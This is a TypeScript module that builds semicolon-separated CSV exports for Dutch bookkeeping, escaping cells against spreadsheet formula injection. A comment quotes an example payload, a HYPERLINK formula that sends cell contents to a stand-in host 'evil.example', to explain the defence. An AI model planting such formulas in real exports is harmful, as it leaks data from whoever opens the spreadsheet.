import { amsterdamDateKey } from "@/lib/timezone";
/*
 * CSV generation for bookkeeping exports.
 *
 * A zzp'er files a quarterly btw-aangifte and hands their year to an accountant;
 * both need the invoice list as a spreadsheet, not as a web page. Same for a
 * facility reconciling what it owes.
 */

/**
 * Escapes one cell.
 *
 * FORMULA INJECTION is the reason this is not just quote-doubling. A cell whose
 * text begins with =, +, - or @ is executed as a formula when the file is opened
 * in Excel or Sheets — and these exports carry names and descriptions typed by
 * other users. A freelancer could set their name to
 *
 *   =HYPERLINK("https://evil.example?d="&A1,"Klik hier")
 *
 * and it would run inside the accountant's spreadsheet. Prefixing a tab neutralises
 * the formula while leaving the text readable in the cell.
 *
 * Tab rather than the more common apostrophe because Excel shows a leading
 * apostrophe as part of the value in some locales, and an accountant seeing
 * mangled names will not trust the rest of the file.
 */
function cell(value: string | number | null | undefined): string {
  // Quoted empty rather than bare empty, so every cell in the file is quoted.
  // A bare `;;` is valid CSV but leaves parsers free to disagree about whether the
  // field is empty or absent, and mixed quoting is the kind of thing that makes an
  // import land one column out.
  if (value === null || value === undefined) return '""';

  const text = String(value);
  const dangerous = /^[=+\-@\t\r]/.test(text);
  const escaped = (dangerous ? `\t${text}` : text).replace(/"/g, '""');

  return `"${escaped}"`;
}

/**
 * Builds a CSV document.
 *
 * Semicolon-separated with a UTF-8 BOM, because the audience is Dutch. Excel in a
 * NL locale treats the comma as a decimal separator and will drop every field of a
 * comma-separated file into one column; without the BOM it renders é and ï as
 * mojibake. Both look like our bug to the person opening it.
 */
export function toCsv(headers: string[], rows: (string | number | null | undefined)[][]): string {
  const lines = [
    headers.map(cell).join(";"),
    ...rows.map((row) => row.map(cell).join(";")),
  ];
  // CRLF: Excel is the target, and it is the line ending the spec actually names.
  return `﻿${lines.join("\r\n")}\r\n`;
}

/**
 * Amount as a Dutch decimal string: 48400 -> "484,00".
 *
 * Unformatted and unprefixed, so a spreadsheet parses it as a number rather than
 * as text. A euro sign here would make every amount unsummable.
 */
export function csvEuros(cents: number): string {
  const sign = cents < 0 ? "-" : "";
  const absolute = Math.abs(cents);
  return `${sign}${Math.floor(absolute / 100)},${String(absolute % 100).padStart(2, "0")}`;
}

/** Hours as a decimal: 450 minutes -> "7,50". */
export function csvHours(minutes: number): string {
  const hours = minutes / 60;
  return hours.toFixed(2).replace(".", ",");
}

/** Filename-safe slug for the Content-Disposition header. */
export function csvFilename(prefix: string, name: string): string {
  const slug = name
    .normalize("NFD")
    .replace(/[̀-ͯ]/g, "")
    .replace(/[^a-zA-Z0-9]+/g, "-")
    .replace(/^-|-$/g, "")
    .toLowerCase();
  /*
   * The Amsterdam day, like every other date this product shows a person.
   *
   * toISOString() gives the UTC date, so an export run at 00:30 in summer was
   * named with yesterday's — and the filename is what somebody files it under
   * and later searches for. lib/timezone.ts exists for exactly this expression.
   */
  return `${prefix}-${slug}-${amsterdamDateKey()}.csv`;
}
